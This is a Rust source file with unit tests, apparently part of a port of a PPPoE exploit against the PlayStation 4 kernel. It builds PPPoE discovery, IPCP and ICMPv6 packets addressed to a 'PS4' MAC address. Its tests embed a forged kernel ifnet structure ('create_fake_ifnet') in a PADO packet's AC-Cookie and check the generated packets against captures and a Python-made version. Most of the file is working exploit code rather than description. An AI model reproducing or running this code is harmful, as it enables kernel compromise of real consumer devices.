pub fn create_pads_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_id: [u8; 2],
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(constants::PPPOE_CODE_PADS); // Code (PADS)
    payload.extend_from_slice(&session_id); // Session ID

    // We know fixed size of 12
    payload.extend_from_slice(&[0, 12]);

    // PPPoE Tag for HUNIQUE
    payload.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    payload.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    payload.extend_from_slice(&host_uniq);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeDiscovery)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

fn create_icmpv6_adv(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    source_v6: [u8; 16],
    target_v6: [u8; 16],
) -> Vec<u8> {
    let mut packet = vec![0u8; 14 + 40 + 8 + 16 + 8]; // Ethernet + IPv6 + ICMPv6 + Target Address + Options

    // Ethernet frame
    {
        let mut eth_packet = MutableEthernetPacket::new(&mut packet[..14]).unwrap();
        eth_packet.set_source(source_mac.into());
        eth_packet.set_destination(target_mac.into());
        eth_packet.set_ethertype(EtherTypes::Ipv6);
    }

    // IPv6 packet
    {
        let mut ipv6_packet = MutableIpv6Packet::new(&mut packet[14..54]).unwrap();
        ipv6_packet.set_version(6);
        ipv6_packet.set_traffic_class(0);
        ipv6_packet.set_flow_label(0);
        ipv6_packet.set_payload_length(32); // TODO fix this constant?
        ipv6_packet.set_next_header(IpNextHeaderProtocols::Icmpv6);
        ipv6_packet.set_hop_limit(0xff);
        ipv6_packet.set_source(source_v6.into());
        ipv6_packet.set_destination(target_v6.into());
    }

    // ICMPv6 Neighbor Advertisement
    {
        let mut icmpv6_packet = MutableIcmpv6Packet::new(&mut packet[54..(54 + 8)]).unwrap();
        icmpv6_packet.set_icmpv6_type(Icmpv6Types::NeighborAdvert);
        icmpv6_packet.set_icmpv6_code(Icmpv6Code(0));

        // Hardcoded flags
        let flags_offset = 4; // First 4 bytes are for type, code, checksum
        packet[54 + flags_offset] = 0xe0;
    }

    // Set the target address (16 bytes IPv6) after the ICMPv6 header
    packet[62..(62 + 16)].copy_from_slice(&source_v6);

    // ICMPv6 Option: Source Link-Layer Address (8 bytes)
    let options_offset: usize = 62 + 16;
    packet[options_offset] = 2; // Type: Source Link-Layer Address
    packet[options_offset + 1] = 1; // Length: 1 (in 8-byte blocks)
    packet[options_offset + 2..(options_offset + 8)].copy_from_slice(&source_mac);

    // Calculate ICMPv6 checksum
    {
        let mut icmpv6_packet = MutableIcmpv6Packet::new(&mut packet[54..]).unwrap();
        let checksum = pnet::packet::icmpv6::checksum(
            &icmpv6_packet.to_immutable(),
            &source_v6.into(),
            &target_v6.into(),
        );
        icmpv6_packet.set_checksum(checksum);
    }

    packet
}

fn create_icmpv6_echo_req(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    source_v6: [u8; 16],
    target_v6: [u8; 16],
) -> Vec<u8> {
    let mut packet = vec![0u8; 14 + 40 + 8]; // Ethernet + IPv6 + ICMPv6 Echo Request

    // Ethernet frame
    let mut eth_packet = MutableEthernetPacket::new(&mut packet[..14]).unwrap();
    eth_packet.set_source(source_mac.into());
    eth_packet.set_destination(target_mac.into());
    eth_packet.set_ethertype(EtherTypes::Ipv6);

    // IPv6 packet
    let mut ipv6_packet = MutableIpv6Packet::new(&mut packet[14..54]).unwrap();
    ipv6_packet.set_version(6);
    ipv6_packet.set_traffic_class(0);
    ipv6_packet.set_flow_label(0);
    ipv6_packet.set_payload_length(8);
    ipv6_packet.set_next_header(IpNextHeaderProtocols::Icmpv6);
    ipv6_packet.set_hop_limit(64);
    ipv6_packet.set_source(source_v6.into());
    ipv6_packet.set_destination(target_v6.into());

    // ICMPv6 Echo Request
    let mut icmpv6_packet = MutableIcmpv6Packet::new(&mut packet[54..]).unwrap();
    icmpv6_packet.set_icmpv6_type(Icmpv6Types::EchoRequest);
    icmpv6_packet.set_icmpv6_code(Icmpv6Code(0));

    // Calculate ICMPv6 checksum
    let checksum = pnet::packet::icmpv6::checksum(
        &icmpv6_packet.to_immutable(),
        &source_v6.into(),
        &target_v6.into(),
    );
    icmpv6_packet.set_checksum(checksum);

    packet
}

fn listen_for_packet<F>(rx: &mut dyn DataLinkReceiver, predicate: F) -> Option<Vec<u8>>
where
    F: Fn(&[u8]) -> bool,
{
    loop {
        match rx.next() {
            Ok(packet) => {
                if predicate(packet) {
                    // Get the raw packet data as a slice
                    return Some(packet.to_vec());
                }
            }
            Err(e) => {
                panic!("An error occurred while reading a packet: {}", e);
            }
        }
    }
}

#[cfg(test)]
mod tests {

    use super::*;
    use pcap::Capture;

    fn get_test_ps4_mac() -> [u8; 6] {
        [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]
    }

    fn get_test_host_mac() -> [u8; 6] {
        [0x07, 0x2c, 0xf6, 0x06, 0xba, 0x9b]
    }

    fn get_test_host_unique() -> [u8; 8] {
        [0x00, 0x2c, 0xf6, 0x06, 0xba, 0x9b, 0xff, 0xff]
    }

    #[test]
    fn test_is_ipcp_conf_req_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_req.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_ipcp_conf_req(packet.data) {
                println!("Found an IPCP CONF REQ packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of IPCP CONF REQ packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_ipcp_conf_ack_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_ack.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_ipcp_conf_ack(packet.data) {
                println!("Found an IPCP CONF ACK packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of IPCP CONF ACK packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_lcp_conf_req_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap =
            Capture::from_file("test_data/lcp_conf_req.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_lcp_conf_req(packet.data) {
                println!("Found an LCP CONF REQ packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of LCP CONF REQ packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_lcp_conf_ack_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap =
            Capture::from_file("test_data/lcp_conf_ack.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_lcp_conf_ack(packet.data) {
                println!("Found an LCP CONF ACK packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of LCP CONF ACK packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }
    #[test]
    fn test_is_padi_packet_from_file() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                println!("Found a PADI packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that 2 PADI packet were found
        assert_eq!(count, 2);
    }

    #[test]
    fn test_is_padr_packet_from_file() {
        let mut cap =
            Capture::from_file("test_data/padr_packet.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_padr_packet(packet.data) {
                println!("Found a PADR packet: {:?}", packet);
                count += 1;
            }
        }
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_icmpv6_router_sol_from_file() {
        let mut cap = Capture::from_file("test_data/icmpv6_router_sol.pcap")
            .expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_icmpv6_router_sol(packet.data) {
                println!("Found an ICMPv6 Router Solicitation packet: {:?}", packet);
                count += 1;
            }
        }
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_lcp_echo_request_from_file() {
        let mut cap = Capture::from_file("test_data/lcp_echo_request.pcap")
            .expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_lcp_echo_request(packet.data) {
                println!("Found an LCP Echo Request packet: {:?}", packet);
                count += 1;
            }
        }
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_icmpv6_nd_ns() {
        let mut cap =
            Capture::from_file("test_data/icmpv6_nd_ns.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_icmpv6_nd_ns(packet.data) {
                println!("Found an LCP Echo Request packet: {:?}", packet);
                count += 1;
            }
        }
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_extract_host_uniq() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_host_uniq(&packet) {
                    Ok(host_uniq) => {
                        println!("Extracted Host-Uniq: {:?}", host_uniq);
                        println!("Extracted Host-Uniq: {:?}", u64::from_be_bytes(host_uniq));
                        // Print the value as hexadecimal
                        println!(
                            "Converted value in hex: 0x{:016x}",
                            u64::from_be_bytes(host_uniq)
                        );

                        // Assert that the Host-Uniq value has the expected length
                        assert_eq!(host_uniq.len(), 8);
                        assert_eq!(u64::from_be_bytes(host_uniq), 0x002cf606ba9bffff)
                    }
                    Err(e) => {
                        panic!("Failed to extract Host-Uniq: {:?}", e);
                    }
                }
            }
        }
    }

    #[test]
    fn test_extract_source_mac() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_ps4_source_mac(&packet) {
                    Ok(source_mac) => {
                        println!("Extracted Source MAC Address: {:?}", source_mac);
                        // Assert that the MAC address has the expected length
                        assert_eq!(source_mac.len(), 6);
                        // Optionally, check the MAC address values
                        assert_eq!(&source_mac, &[0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]);
                    }
                    Err(e) => {
                        panic!("Failed to extract Source MAC Address: {:?}", e);
                    }
                }
            }
        }
    }

    use std::fs::File;
    use std::io::Read;
    use std::io::Write;
    #[test]
    fn test_fake_ifnet_comparison() {
        // Generate fake ifnet using the Rust implementation
        let pppoe_softc: u64 = 0x123456789ABCDEF0;
        let rust_fake_ifnet = create_fake_ifnet(pppoe_softc);

        // Dump the fake ifnet to a file
        let mut rust_file =
            File::create("test_data/rust_fake_ifnet.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_ifnet)
            .expect("Failed to write to file");

        // Load the fake ifnet generated by Python
        let mut python_fake_ifnet = Vec::new();
        let mut python_file =
            File::open("test_data/fake_ifnet.bin").expect("Failed to open Python fake ifnet file");
        python_file
            .read_to_end(&mut python_fake_ifnet)
            .expect("Failed to read Python fake ifnet file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_ifnet.len(),
            python_fake_ifnet.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_fake_ifnet
            .iter()
            .zip(python_fake_ifnet.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    fn compare_packets(packet_type: &str, expected: &[u8], generated: &[u8]) {
        let generated_filename = format!("test_data/generated_{}.bin", packet_type);
        let expected_filename = format!("test_data/expected_{}.bin", packet_type);

        // Write the generated packet to a binary file
        let mut generated_file = File::create(&generated_filename)
            .expect("Failed to create binary file for generated packet");
        generated_file
            .write_all(generated)
            .expect("Failed to write generated packet to binary file");

        // Write the expected packet to a binary file
        let mut expected_file = File::create(&expected_filename)
            .expect("Failed to create binary file for expected packet");
        expected_file
            .write_all(expected)
            .expect("Failed to write expected packet to binary file");

        // Compare the lengths of the expected and generated packets
        assert_eq!(
            expected.len(),
            generated.len(),
            "Packet lengths are not equal for {}",
            packet_type
        );

        // Compare the contents of the expected and generated packets byte by byte
        for (idx, (expected_byte, generated_byte)) in
            expected.iter().zip(generated.iter()).enumerate()
        {
            assert_eq!(
                expected_byte, generated_byte,
                "Byte mismatch at index {} for {}: expected {:02x}, got {:02x}",
                idx, packet_type, expected_byte, generated_byte
            );
        }

        // Delete the temporary files
        remove_file(&generated_filename).expect("Failed to delete generated packet file");
        remove_file(&expected_filename).expect("Failed to delete expected packet file");
    }

    #[test]
    fn test_create_pado_packet() {
        // Open the pcap file containing the expected PADO packet
        let mut cap =
            Capture::from_file("test_data/pado_to_ps4.pcap").expect("Failed to open pcap file");

        // Extract the PADO packet from the file
        let expected_packet = cap.next_packet().expect("Failed to read PADO packet");

        // Define the input parameters for creating the PADO packet
        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let ifnet = create_fake_ifnet(0xffff9bba06f62c00);
        let ac_cookie = ifnet;
        let host_uniq = get_test_host_unique();

        // Create the PADO packet using the provided function
        let generated_pado_packet =
            create_pado_packet(source_mac, target_mac, ac_cookie, host_uniq);

        // Write the generated PADO packet to a binary file
        let mut generated_file =
            File::create("test_data/generated_pado.bin").expect("Failed to create binary file");
        generated_file
            .write_all(&generated_pado_packet)
            .expect("Failed to write packet to binary file");

        // Write the expected PADO packet to a binary file
        let mut expected_file =
            File::create("test_data/expected_pado.bin").expect("Failed to create binary file");
        expected_file
            .write_all(&expected_packet.data)
            .expect("Failed to write packet to binary file");

        // Compare the lengths of the expected and generated packets
        assert_eq!(
            expected_packet.data.len(),
            generated_pado_packet.len(),
            "Packet lengths are not equal"
        );

        // Compare the contents of the expected and generated packets byte by byte
        for (idx, (expected_byte, generated_byte)) in expected_packet
            .data
            .iter()
            .zip(generated_pado_packet.iter())
            .enumerate()
        {
            assert_eq!(
                expected_byte, generated_byte,
                "Byte mismatch at index {}: expected {:02x}, got {:02x}",
                idx, expected_byte, generated_byte
            );
        }
    }

    #[test]
    fn test_create_ipcp_conf_ack() {
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_ack.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read IPCP CONF ACK packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let ip_address = [42, 42, 42, 42];
        let dns = constants::FAKE_PRIMARY_DNS_SERVER;

        let generated_packet = create_ipcp_conf_ack(
            source_mac,
            target_mac,
            session_data,
            session_id,
            3, // the test data has 3 for ipcp req
            ip_address,
            dns,
        );

        compare_packets("ipcp_conf_ack", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_ipcp_conf_nak() {
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_nak.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read IPCP CONF NAK packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let ip_address = [42, 42, 42, 42];

        let generated_packet = create_ipcp_conf_nak(
            source_mac,
            target_mac,
            session_data,
            session_id,
            2, // test uses 2
            ip_address,
        );

        compare_packets("ipcp_conf_nak", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_ipcp_conf_request() {
        let mut cap = Capture::from_file("test_data/ipcp_conf_request.pcap")
            .expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read IPCP CONF REQUEST packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let ip_address = constants::SOURCE_IPV4;

        let generated_packet = create_ipcp_conf_request(
            source_mac,
            target_mac,
            session_data,
            session_id,
            0x41, //test uses 0x41
            ip_address,
        );

        compare_packets(
            "ipcp_conf_request",
            &expected_packet.data,
            &generated_packet,
        );
    }

    #[test]
    fn test_create_pads_packet() {
        let mut cap =
            Capture::from_file("test_data/pads_packet.pcap").expect("Failed to open pcap file");
        let expected_packet = cap.next_packet().expect("Failed to read PADS packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let host_uniq = get_test_host_unique();

        let generated_packet = create_pads_packet(source_mac, target_mac, session_id, host_uniq);

        compare_packets("pads_packet", &expected_packet.data, &generated_packet);
    }
    use std::fs::remove_file;

    #[test]
    fn test_create_icmpv6_adv() {
        let mut cap =
            Capture::from_file("test_data/icmpv6_adv.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read ICMPv6 Advertisement packet");

        let source_mac: [u8; 6] = get_test_host_mac();
        let target_mac: [u8; 6] = get_test_ps4_mac();
        let source_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        ];
        let target_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0xca, 0x63, 0xf1, 0xff, 0xfe, 0x44, 0x45,
            0x97, //TODO make this constatn
        ];

        let generated_packet = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);

        compare_packets("icmpv6_adv", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_icmpv6_echo_req() {
        let mut cap =
            Capture::from_file("test_data/icmpv6_echo_req.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read ICMPv6 Echo Request packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let source_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        ];
        let target_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0xca, 0x63, 0xf1, 0xff, 0xfe, 0x44, 0x45,
            0x97, //TODO make this constatn
        ];

        let generated_packet = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        compare_packets("icmpv6_echo_req", &expected_packet.data, &generated_packet);
    }
}
